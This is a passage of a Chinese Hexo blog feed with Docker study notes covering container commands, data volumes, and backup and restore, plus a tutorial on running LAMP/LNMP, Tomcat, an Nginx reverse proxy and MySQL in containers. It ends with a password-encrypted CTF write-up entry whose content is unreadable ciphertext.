镜像id/镜像名[:tag]#-d 代表后台运行容器#-p 宿主机端口:容器端口 为了端口映射#-v 宿主机目录:容器目录 为了目录映射#--name 指定容器名#-e 指定一个环境名，如MySQL容器指定MySQL密码:-e MYSQL_ROOT_PASSWORD=123456#运行交互式容器docker run -it 镜像id/镜像名[:tag] /bin/bash退出交互式bash(这样容器就会在后台运行):Ctrl+P Ctrl+Q#-i 以交互模式运行容器#-t 为创建的容器分配一个伪tty终端docker run 镜像id/镜像名[:tag] apt-get install -y app_name #在容器安装新的程序docker attach 容器id/容器名 #进入容器，交互式docker ps [-qal] #查看正在运行的容器#-a 查看全部容器，包括没有运行的#-q 只查看容器的标识#-l 列出最近一次启动的容器docker logs -f 容器id/容器名 #查看容器日志#-f 可以滚动查看日志的最后几行docker diff 容器id/容器名 #查看容器修改操作docker top 容器id/容器名 #查看容器内进程docker inspect 容器id/容器名 #获取容器信息,如容器内部ipdocker exec -it 容器id/容器名 /bin/bash #进入到容器内部#也可写成docker exec -it 容器id/容器名 bash#-i 以交互模式运行容器#-t 为创建的容器分配一个伪tty终端docker stop 容器id/容器名 #停止指定容器docker stop $(docker ps -qa) #停止所有容器docker kill 容器id/容器名 #杀死指定容器docker start 容器id/容器名 #启动容器docker restart 容器id/容器名 #重启容器docker rm 容器id/容器名 #删除容器(删除前，需停止容器)docker rm $(docker ps -qa) #删除所有容器(删除前，需停止容器)docker cp 文件名 容器id/容器名:容器内部路径 #将宿主机的内容复制到容器内部</code></pre><h3 id="3、远程访问"><a href="#3、远程访问" class="headerlink" title="3、远程访问"></a>3、远程访问</h3><p>参考之前我写的博客：<a href="https://blog.csdn.net/qq_43625917/article/details/104272473" target="_blank" rel="noopener">Docker学习笔记(一)-容器、镜像和客户端与守护进程</a></p><h2 id="0x02-Docker容器的数据管理"><a href="#0x02-Docker容器的数据管理" class="headerlink" title="0x02 Docker容器的数据管理"></a>0x02 Docker容器的数据管理</h2><h3 id="1、Docker容器的数据卷"><a href="#1、Docker容器的数据卷" class="headerlink" title="1、Docker容器的数据卷"></a>1、Docker容器的数据卷</h3><p><strong>1.数据卷</strong><br>数据卷是经过特殊设计的目录，可以绕过联合文件系统(UFS)，为一个或多个容器提供访问。<br>数据卷设计目的，在于数据的永久化，它完全独立于容器的生存周期。<br><strong>2.数据卷的特点</strong></p><ul><li>数据卷在容器启动时初始化，如果容器使用的镜像在挂载点包含了数据，这些数据会拷贝到新初始化的数据卷中。<ul><li>数据卷可以在容器之间共享或重用数据</li><li>可以对数据卷的内容直接进行修改</li><li>数据卷的变化不会影响镜像的更新</li><li>卷会一直存在，即使挂载数据卷的容器已经被删除</li></ul></li></ul><p><strong>3.数据卷基本操作</strong></p><blockquote><p>数据卷：将宿主机的一个目录映射到容器的一个目录中<br>可以在宿主机中操作目录中的内容，那么容器内部映射的文件也会跟着一起改变</p></blockquote><p>（1）创建数据卷</p><pre><code class="shell">docker volume create 数据卷名#创建后，默认会存放在/var/lib/docker/volumes/数据卷名/_data</code></pre><p>（2）查看数据卷详细信息</p><pre><code class="shell">docker volume inspect 数据卷名</code></pre><p>（3）查看全部数据卷</p><pre><code class="shell">docker volume ls</code></pre><p>（4）删除数据卷</p><pre><code class="shell">docker volume rm 数据卷名</code></pre><p>（5）应用数据卷</p><pre><code class="shell">#当映射数据卷时，若数据卷不存在，Docker会自动创建。会将容器内部自带文件存储在数据卷默认路径docker run -v 数据卷名:容器内部路径 镜像id#直接指定一个路径作为数据卷的存放位置。指定路径下是空的，不会把容器内的文件带出来docker run -v 路径:容器内部路径 镜像id</code></pre><p><strong>4.数据卷的使用</strong><br>（1）为容器添加数据卷</p><pre><code class="shell">docker run --name dvt1 -v ~/container_data:/data -it ubuntu /bin/bash</code></pre><p><img src="http://img-blog.csdnimg.cn/20200710160144515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200710160516810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）为数据卷添加访问权限</p><pre><code class="shell">docker run --name dvt2 -v ~/datavolume:/data:ro -it ubuntu /bin/bash#ro 容器内只读</code></pre><p><img src="http://img-blog.csdnimg.cn/20200710160730672.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200710161113385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（3）使用Dockerfile构建包含数据卷的镜像</p><pre><code class="shell">FROM ubuntu:latestVOLUME [&quot;/datavolume1&quot;,&quot;/datavolume2&quot;]CMD /bin/bash</code></pre><p>构建镜像</p><pre><code class="shell">docker build -t=&#39;qwzf/dvt&#39; .</code></pre><p>运行镜像并查看镜像中指定目录</p><pre><code class="shell">docker run --name dvt3 -it qwzf/dvtdocker inspect dvt3</code></pre><p><img src="http://img-blog.csdnimg.cn/2020071017313264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200710173345740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2、Docker的数据卷容器"><a href="#2、Docker的数据卷容器" class="headerlink" title="2、Docker的数据卷容器"></a>2、Docker的数据卷容器</h3><p><strong>1.数据卷容器</strong><br>命名的容器挂载数据卷，其他容器通过挂载这个容器实现数据共享，挂载数据卷的容器，就叫数据卷容器。<br><strong>2.使用数据卷容器</strong><br>挂载数据卷容器的方法</p><pre><code class="shell">docker run -it --name 其他容器 --volumes-from 数据卷容器名 镜像名 /bin/bash</code></pre><p>例：</p><pre><code class="shell">docker run -it --name dvt4 qwzf/dvt #启动数据卷容器docker run -it --name dvt5 --volumes-from dvt4 ubuntu /bin/bash #挂载数据卷容器#1、数据卷虚拟机开启或者关闭对共享无影响#2、数据卷虚拟机多次作为共享目录，也可以做共享#3、数据卷多次挂在，有重复名字，则以最后一个--volumes-from的为最后结果#4、如果已经挂载数据卷容器的容器，删除数据卷容器对其无影响</code></pre><p><img src="http://img-blog.csdnimg.cn/20200710183729299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="3、Docker数据卷的备份和还原"><a href="#3、Docker数据卷的备份和还原" class="headerlink" title="3、Docker数据卷的备份和还原"></a>3、Docker数据卷的备份和还原</h3><h4 id="1-数据备份"><a href="#1-数据备份" class="headerlink" title="1.数据备份"></a>1.数据备份</h4><p><img src="http://img-blog.csdnimg.cn/20200710221600388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="shell">docker run --volumes-from 需要备份的容器名 -v ~/backup:/backup ubuntu tar cvf /backup/backup.tar 需要备份的目录</code></pre><p>例：</p><pre><code class="shell">docker run --volumes-from dvt5 -v ~/backup:/backup --name dvt11 ubuntu tar cvf /backup/dvt5.tar /datavolume1</code></pre><p><img src="http://img-blog.csdnimg.cn/20200710222507435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-数据还原"><a href="#2-数据还原" class="headerlink" title="2.数据还原"></a>2.数据还原</h4><pre><code class="shell">docker run -v 需要还原的目录 --volumes-from 需要还原的容器名 -v ~/backup:/backup ubuntu tar xvf /backup/backup.tar</code></pre><p>例：</p><pre><code class="shell">docker run -v /datavolume1 --name dvt12 --volumes-from dvt5 -v ~/backup:/backup ubuntu tar xvf /backup/dvt5.tar</code></pre><p><img src="http://img-blog.csdnimg.cn/2020071022463241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>docker相关的基础知识又学了一些。本篇博客记录了<code>镜像和容器的常用操作</code>、<code>docker容器的数据卷和数据卷容器</code></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 常用操作 </tag>
            
            <tag> 数据卷容器 </tag>
            
            <tag> 备份和还原 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker练习(一)-安装LA(N)MP、Tomcat和Nginx及MySQL</title>
      <link href="/2020/06/30/Docker%E7%BB%83%E4%B9%A0(%E4%B8%80)-%E5%AE%89%E8%A3%85LA(N)MP%E3%80%81Tomcat%E5%92%8CNginx%E5%8F%8ANginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2020/06/30/Docker%E7%BB%83%E4%B9%A0(%E4%B8%80)-%E5%AE%89%E8%A3%85LA(N)MP%E3%80%81Tomcat%E5%92%8CNginx%E5%8F%8ANginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-安装LAMP"><a href="#0x01-安装LAMP" class="headerlink" title="0x01 安装LAMP"></a>0x01 安装LAMP</h3><p><strong>可能用到的命令</strong></p><pre><code class="shell">#拉取镜像docker pull tutum/lamp#查看镜像docker images#启动容器并绑定端口docker run -d -p 8080:80 -p 3306:3306 -v /var/www/app/:/var/www/html tutum/lamp#查看运行的容器docker psdocker ps -a#进入正在运行的容器docker exec -it &#39;id/name&#39; /bin/bash  #退出容器exit#开启、重启、停止容器docker start &#39;id/name&#39;docker restart &#39;id/name&#39;docker stop &#39;id/name&#39;</code></pre><p>具体安装过程如下：<br><strong>1.查询镜像</strong></p><pre><code class="shell">root@qwzf:~# docker search lampNAME                          DESCRIPTION                                     STARS               OFFICIAL            AUTOMATEDlinode/lamp                   LAMP on Ubuntu 14.04.1 LTS Container            179                                     mattrayner/lamp               A simple LAMP docker image running the prere…   170                                     [OK]tutum/lamp                    Out-of-the-box LAMP image (PHP+MySQL)           132                                     greyltc/lamp                  a super secure, up-to-date and lightweight L…   99                                      [OK]fauria/lamp                   Modern, developer friendly LAMP stack. Inclu…   79                                      [OK]</code></pre><p><strong>2.拉取镜像</strong></p><pre><code class="shell">docker pull tutum/lamp</code></pre><p><strong>3.启动守护式容器并端口映射和挂载目录</strong></p><pre><code class="shell">root@qwzf:~# docker run --name=lamp -d -p 8080:80 -p 3306:3306 -v /var/www/app/lamp/:/var/www/html tutum/lamp#8080 宿主机端口 80 docker端口#/var/www/app/lamp/ 宿主机要挂载的目录#/var/www/html docker上被挂载的位置</code></pre><p><img src="http://img-blog.csdnimg.cn/20200214024109657.jpg" alt="在这里插入图片描述"></p><h3 id="0x02-安装LNMP"><a href="#0x02-安装LNMP" class="headerlink" title="0x02 安装LNMP"></a>0x02 安装LNMP</h3><p><strong>1.查询镜像</strong></p><pre><code class="bash">docker search lnmp</code></pre><p><strong>2.拉取镜像</strong></p><pre><code class="bash">docker pull winstonpro/lnmp</code></pre><p><strong>3.启动守护式容器并端口映射和挂载目录</strong></p><pre><code class="bash">root@qwzf:~# docker run --name=lnmp -d -p 8000:80 -p 3000:3306 -v /var/www/app/lnmp/:/usr/share/nginx/html winstonpro/lnmp</code></pre><p><img src="http://img-blog.csdnimg.cn/2020021402412624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x03-安装vim"><a href="#0x03-安装vim" class="headerlink" title="0x03 安装vim"></a>0x03 安装vim</h3><p><strong>方式一：默认源安装</strong><br>执行apt-get update更新源</p><pre><code class="shell">root@dc3d333fc181:~# apt-get update</code></pre><p>更新完过后我们就可以安装了vim了</p><pre><code class="shell">root@dc3d333fc181:~# apt-get install vim</code></pre><p>以上的方式虽然可以实现安装vim，但是速度很慢。下面是更快的方式<br><strong>方式二：aliyun源安装</strong><br>因为没有vi,vim编辑工具，我这里使用sed命令进行编辑文件内容。<br>首先查看默认源地址：</p><pre><code class="shell">root@dc3d333fc181:~# cat /etc/apt/sources.list</code></pre><pre><code class="php"># deb http://snapshot.debian.org/archive/debian/20200130T000000Z buster maindeb http://deb.debian.org/debian buster main# deb http://snapshot.debian.org/archive/debian-security/20200130T000000Z buster/updates maindeb http://security.debian.org/debian-security buster/updates main# deb http://snapshot.debian.org/archive/debian/20200130T000000Z buster-updates maindeb http://deb.debian.org/debian buster-updates main</code></pre><p>从上面的输出内容我们可以看出，默认会从<code>deb.debian.org</code>去更新源信息。我们将其替换为aliyun的源地址：</p><pre><code class="shell">root@dc3d333fc181:~# sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list</code></pre><p>替换完源后我们就可以安装vim了</p><pre><code class="shell">root@dc3d333fc181:~# apt-get cleanroot@dc3d333fc181:~# apt-get updateroot@dc3d333fc181:~# apt-get install vim</code></pre><h3 id="0x04-安装Tomcat"><a href="#0x04-安装Tomcat" class="headerlink" title="0x04 安装Tomcat"></a>0x04 安装Tomcat</h3><p><strong>1.查找tomcat镜像</strong></p><pre><code class="shell">docker search tomcat</code></pre><p> <img src="http://img-blog.csdnimg.cn/20200630154108234.png" alt="在这里插入图片描述"><br><strong>2.拉取tomcat版本为7的镜像</strong><br>可以先看一下镜像是否已经拉取</p><pre><code class="shell">docker images</code></pre><p>拉取tomcat版本为7的镜像</p><pre><code class="shell">docker pull tomcat:7</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630154030137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.启动Tomcat</strong><br>可以先看一下容器是否已经启动</p><pre><code class="shell">docker ps -a</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630154353432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没找到，说明没启动，需要启动tomcat容器。<br>查看一下tomcat镜像</p><pre><code class="shell">docker images</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630154530356.png" alt="在这里插入图片描述"><br>启动Tomcat容器</p><pre><code class="shell">docker run --name tomcat -d -p 8000:8080 734d712b8777</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630154608801.png" alt="在这里插入图片描述"><br>容器启动成功。<br><strong>4.移动Tomcat自带的项目文件ROOT</strong><br>进入容器</p><pre><code class="shell">docker exec -it tomcat /bin/bash</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630154829264.png" alt="在这里插入图片描述"><br>将webapps.dist目录文件下tomcat自带的项目文件ROOT移动到webapps目录文件下</p><pre><code class="shell">mv ./webapps.dist/ROOT webapps/</code></pre><p> <img src="http://img-blog.csdnimg.cn/20200630154920767.png" alt="在这里插入图片描述"><br><strong>5.访问测试</strong><br>访问测试一下<br><img src="http://img-blog.csdnimg.cn/20200630154954500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 访问成功，Tomcat服务构建成功。</p><h3 id="0x05-安装Nginx并实现反向代理"><a href="#0x05-安装Nginx并实现反向代理" class="headerlink" title="0x05 安装Nginx并实现反向代理"></a>0x05 安装Nginx并实现反向代理</h3><p> <strong>1.查找nginx镜像</strong></p><pre><code class="shell">docker search nginx</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630215138841.png" alt="在这里插入图片描述"><br><strong>2.拉取nginx镜像</strong><br>拉取箭头所指的镜像</p><pre><code class="shell">docker pull nginx</code></pre><p><img src="http://img-blog.csdnimg.cn/2020063021522290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.启动nginx容器</strong></p><pre><code class="shell">docker run --name nginx_1 –d –p 8888:80 nginx</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630215639394.png" alt="在这里插入图片描述"><br><strong>4.访问测试</strong><br> <img src="http://img-blog.csdnimg.cn/20200630221459895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问成功，说明nginx安装成功。<br><strong>5.设置反向代理并测试</strong><br>首先进入容器</p><pre><code class="shell">docker exec -it nginx_1 /bin/bash</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630221637152.png" alt="在这里插入图片描述"><br>安装vim</p><pre><code class="shell">sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.listapt-get cleanapt-get updateapt-get install vim</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630222044620.png" alt="在这里插入图片描述"><br>用vim打开nginx.conf配置文件，并添加以下选项</p><pre><code class="shell">vim /etc/nginx/nginx.conf</code></pre><p> <img src="http://img-blog.csdnimg.cn/20200630222202710.png" alt="在这里插入图片描述"><br>打开/etc/nginx/conf.d/目录，发现.conf后缀的文件只有default.conf文件。<br>打开default.conf文件配置反向代理：</p><pre><code class="shell">vim /etc/nginx/conf.d/default.conf</code></pre><pre><code class="shell">server{    listen    80;    server_name    39.105.93.165:8888; #nginx反向代理服务器IP地址或域名    location / {        root    /usr/log/nginx/html;        index    index.html    index.htm;        proxy_pass    http:39.105.93.165:8000; #被代理的服务IP地址或域名}</code></pre><p><img src="http://img-blog.csdnimg.cn/20200630224311343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>意思是：通过访问<code>http://39.105.93.165:8888</code>，其实访问到的是<code>http://39.105.93.165:8000</code><br>保存退出，然后重启容器</p><pre><code class="shell">docker restart nginx_1</code></pre><p> <img src="http://img-blog.csdnimg.cn/20200630222823557.png" alt="在这里插入图片描述"><br>然后访问<code>http://39.105.93.165:8888</code><br> <img src="http://img-blog.csdnimg.cn/20200630224434384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样访问的nginx服务器<code>http://39.105.93.165:8888</code><br>其实是访问到了的是服务地址为<code>http://39.105.93.165:8000</code>的tomcat服务<br>从而实现简单的反向代理。</p><h3 id="0x06-安装MySQL"><a href="#0x06-安装MySQL" class="headerlink" title="0x06 安装MySQL"></a>0x06 安装MySQL</h3><p> <strong>1.查找MySQL镜像</strong></p><pre><code class="shell">docker search mysql</code></pre><p><strong>2.拉取MySQL版本5.7的镜像</strong></p><pre><code class="shell">docker pull mysql:5.7</code></pre><p><strong>3.启动MySQL容器</strong></p><pre><code class="shell">docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</code></pre><p><strong>4.使用navicat连接测试</strong><br> <img src="http://img-blog.csdnimg.cn/20200709010909127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，说明MySQL安装成功<br><strong>5.目录映射</strong><br>先停止并删除MySQL的docker容器</p><pre><code class="shell">docker stop mysqldocker rm mysql</code></pre><p>使用-v选项对<code>/etc/mysql</code>、<code>/var/log/mysql</code>、<code>/var/lib/mysql</code>目录进行目录映射</p><pre><code class="shell">docker run --name mysql_1 -p 3306:3306 \-v /usr/local/docker/mysql/conf:/etc/mysql \-v /usr/local/docker/mysql/logs:/var/log/mysql \-v /usr/local/docker/mysql/data:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 </code></pre><p>映射成功</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 服务安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2020擂台题Web总结与复现</title>
      <link href="/2020/06/05/ISCC2020%E6%93%82%E5%8F%B0%E9%A2%98Web%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/06/05/ISCC2020%E6%93%82%E5%8F%B0%E9%A2%98Web%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，才能查看文章哦！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1561eca3c78e73f60b2fc00ed51641b1ad67e4c98dd999aa65dea6aeddec560c">7e53e34816f16c1a338a37b24e3488d482962956c4a9690f677ec160e41e8e07b080ca2e84cc80a01cb966c5cf49b8358994d8caf49f571ef0fc729b9f80c5b5efea6691682d9d3813c2de8b2cbd877d14529e320d993ab8d5aee63db7a35e4ffe38355a2c89402c391173ff7071272226abd26ba9cf047f816c61f6dfefafb5d107c3c96253dd71e3a2016e63b42cd17c836fabd181791e9cacd0e073fbbd06310d7d4a4c7e70c1836575b5d4b99fc27623a869afab19ef8fbd8b0d7306e59b7283f4a932418105ac26079d58f97a0c1c6b29d99f4309550c62b73e72fe195c3a709d2c7a38844d3e6efec47b9cb7658e32c8bf6f999655ccc2c171938c1833c6d0c28bc47f73dfa917e9884347b0bb77d26cca2fb16c0007dec1904b9190cbe0037d1f8e6ac4d62930208d1b030a14c03bb7f30990222d4fa4318bae65f8a5aa256f803aa6b8cc68aa072994b79764ebf5e3297d02aec4ca29d7469f8b4763a9e39e9ef14e257fc059eac1cf3c4edbd7a394ad9891186372488bfcebd31f46aab2b89f4f416d9f4127da74a88b8b249852815fcabdd09b78707220543a4e18aa173921806b1fd07019707068356fde179f2894c787b1fdbebd165f7705efa2b6556d8cc12dbb2e64ec347abdef475ced4bc81a7a5b2e299c2ef3ead5e61b92278e45d0792ebb1443732c8d7f206149f3e4c26660cee4389f46785cdade29c4b860317ff6426e203109447f609c94ee1710cc9f70aea21195f52c4a34d2438f7382602798f03ee64a8e9c1b800243bce35bb2cd2d2b1a92f9c1de567f75efa82aa71b603632fb90bc01d89306621876bb7a28550652775256d9c0b80b16c494e2c4117253cec8131b28ba5ffe5b5c0226146bc358b09d6f8d8e1a2a6d24c7a312aeeba35953cd5857f636b94e2a3368a08b1a15097222099d52fa153890f6582aa119cc76bce68764c6b47fa0e0781e3fe9919d13b09301576405ce0ba5765e322979164a62235a1817756646dbbb32313388e0ede9695e04828900d92cd4b33b0ae9aedadbeada5e9044855ce30443d4744ff82c46ac6820ea68d852518718bf129734aeed823de80e93ca7d7e43acd40907a3e8d90712e261d04b7d176e467a2111c61eab0131ebd309266b3eebe28e02f2a35f6068e5d76f378c879b0b4dcead9e2039b66cd2a6b6abf49699c2f8f32f3ce10161bc3c456612acfa5017a33cda16c16434966a036ce5f520bcff54ecc2a7d520e323c9763fe385de5b95ffe2353bcd4148c71d644f648104451509eadffe1b2a9b7439bc10a84d19f92cd9e4a65cf39b7fab655aeec60aef9cd6b080c38648638ef778451bf0f33fd305d9da71fcc014fe6e3e5ae145997d05ace1e6618aeefb894e88e19c7d3138d7ba79b302a18b7bd48fbb1c8f1d1501f83a0e010d508f1db26de07d010e5a992779dd35c2526789888d4dc748d7ec670bce5daf36d88c0bb9e6bc6c1edcf11116e6858b26dec0398db84dfb693347dc2390f3569f51f8ef9e5e590f6227c2a445bdb1dab63fdbd0945769c0878837fb01cf45b54b5ddb9c590ee4a74256e1308435b0d13d28fb23d286bcb1843c9d14f83b9b066f52badf489f9897e29bb35f56aad669b86a4acb81432e92de7bd9228affbdfe093cdc7e1e3d4d64b75df406c77a7dfae575adb215b1692914e62c8988872e158b8cd26db0632bf6ce5da16c1fc95a2210f1a993df05c98da663370161d9145ebc641f42a31449a995b045d10beda9b80e11dabf7bb2a1c45f3b7ed7e765d73c57bf530c9a9b166ab95729781c09f630145a81782d4a6f28c57341a8628f5759061cdb0cf403fcd12f61cf1f17a50bbd256cd6e27b14162abaa17e44271a4c5f872733c01fc14262bf2d1d5a8bead4f3ef483c2118d0b65ef1c152b620bd3326d90f4b995742538d758ca8473279e233c11a8bcaf25598a43d29082b6264fef6b6acaeb1325cfce5f24f3ff69a26a6328aeaa957a7d28e2683e6962c6a3d19a1ebbed097074df96c88d2d03e7d4995765aee1354318c97209d129ecc20e618a67828ca93584d15e17c5433347ae60f5db9197c97a37e7854bcc19cb99a662ee202599df8d6e43887404d8ad3c8b0fd0c0dcf5d07edf7dc7313d174d1ccf70ab9e656890f3fed35819f42257c7b196d5dd84aa7b863e24b44f15ff46cbf29c653832063c1172142d27d9e588aaaebce4f33dfa51adc519c40d1a714c25a0b74a8cf88fceb067b40246cd03440731e325af7e4807bd9b95911c02b335b192eb783e75281653739f965ad0ee4caf04016f61a8fae7c95658af7dbfce8487518e666749246e40b368e80810dc83b6f0d27b598fe0f5fab93571a4e866cec40d8f7f07d9ae320e5b4930617399352d8b3308d92989f1a46b04d7265ef77acda10fd15b29cd5647718e8a41183fe8c4c78c4beafd599587b544bfeffc710af06b35df1b396e6a3d61d041a8ecb4f39df7e8b479b241edea0f22e5f0ac15a367f3918e484bf7dd54dc1c5c9b9e7dc48c3507ff50dd023405036068a35435cb182bb823bb9263a36bbfc32a790e957ab79e1a7f09b71895318dab9793c0a39d80352b53ad3e720e8bfdfd7126fd0b91729643697a0d8bce2f03e90757b1e9acaa7ea3adf35da50a878261c6f444909203780aaeaf182b7910ca56731e54906fd0f1549f6583162662a9e8a3dc8316e458aff219ec81d76db0ece6d42226fef0f421653106e8b5ed98bb32e9dec070fa0d390c7f091a3a6fd6b091a2b75ca8d40a65cfe031180e7e275189afd075f9a2f363b330baac45333cb4a956d990d29351f20d986ba956387152044c69372e42b6307d42617c55e3b6e2168f841ebb30388bb0280a20bcf36d3cf1dcd5b0b560dace85b2ef61cdd6237a1ca27eb9bf9286c84c271b1ae2251d09ada605598d133d736a444cd0cbcc75068ac5bdbd8c57b5443e242b3ea389a181c75346e2cbd67a5b7d3adb3740250e63747ff84d5a1c9a2dc7ed95d0cd51a777ac520241e86214aec1a23654cdd14cc5845753de7a97abf60f280a11bd7479d8c0ebfb5c9e4704245879bb0c4fc735043060961bb66f28943f2d70b16040eb1335459235f00a0de064eb0b0fe28014bf7287cadf840080a3548606f964421af2f028df5075d4f57a45edabfafc79b84535b053354e63886419e88445f8c13be3010216a02117d6745c7f97183bd58a631a19b909cc9d4797f3b788fb360f37437181577da029cabb194d1479becc91a2fb51831cb4e747c202c5e5d9aa5c762659fed3ed5d5fa220fded1ec871ae325e04f7385cfb963e3a45c58e6c872e9e39bc902c7e7ae8b5b7c860af31022cac4d6323be2dd449237739496a59a8cce7d4519fe9255eb9304c768f3b23676b63cfcd62b7807280a0abfc0919a6d3fb37fddc40a54962644295a24ef2d3d348fe766e9ebbf62f7fc5b939f2e0aa35547182053fde5720b7e908d51e9780391c717eae6ff72585781c253ee10c6cd745b47d1ff0ae3694a20c76e257c65665cf0378804b6f19973b0070f6ab6fd50e6b530d3af62dda388ee2309da85f0778c3b3c875720492e5c8658b8e2b4b46150a5512f275613ef6649aed5323d67c92fdda033cd1816bf5d6a91e3a2bafdc26704e7f8cf78484c460ff1dc39d0498866bc54ebbd738461494ffe1de599117a0e1ca223f4ca8bf5a737d60ac0c2cff4b9120b40fd1808cfb9757cfb207608e5ca0635ccd2830f2af4138fe34c855d2f9d7cc59c16e3dec0abbd28891ceeefc644e96aac8d4c1fb840c995ca45eb9b79b53f00b6209f81c591796593cb3df6f5fea5b06466391d9adfdcc523948493872fb3e7be2afe9f6c5ff82d73baa00ccf758e1537239a8afda8ef1919a648df2be62e126369a6e66d547ebd7a10c980fa60e07ed8a3df65291596c38dc22f4aad26555393843afa2a99f12a8bb618198c8f3703c472b9a4789057c997dccd466851f636a820ea4e99a48be15a23be7df8d0dd9e5053b6e0b76eb317de54f4aee19cf9b45c2e3b92699cde5981b7ab3251294df608d257ad468a114bcd1e1267f15f40adeb0f221ffdc0f6fc60440ef3e8c0ad21d12f8532267f35b4918ca2755c2e655814798a383079dbdde7f7eec00a1930de0306e0e975bfeeccc116f8f53bb2e3efbd3ea5db73e199284cab1f85d681b171981c489daf55bbc253cbc73ff70540f8511707955282c2bb438fd1cfb4f8f27eda51728e46ad02d8adfc50d7244f0c741c7bc5dc753f59c78686c59424f62cc94a4691d3dcc75f1d4c1204e187e9708f0500b0198bd478d01e1526337e38e8bb063bca7d1c443044ef8eec79960caca416efba260fd73c4ea53fb16b52447df5a602a9d1cdc1c47f1824011a9033eb7b6555c641ef95a0802c4d2c5af820cd66b0867007b807e9f6fc0d7800eb957f19a62a0532190f30678ad87c8559a64c90345dabe98510e78905523cc736b0826590ece642f42b6033f320b99a15f664fba744a4fc3efe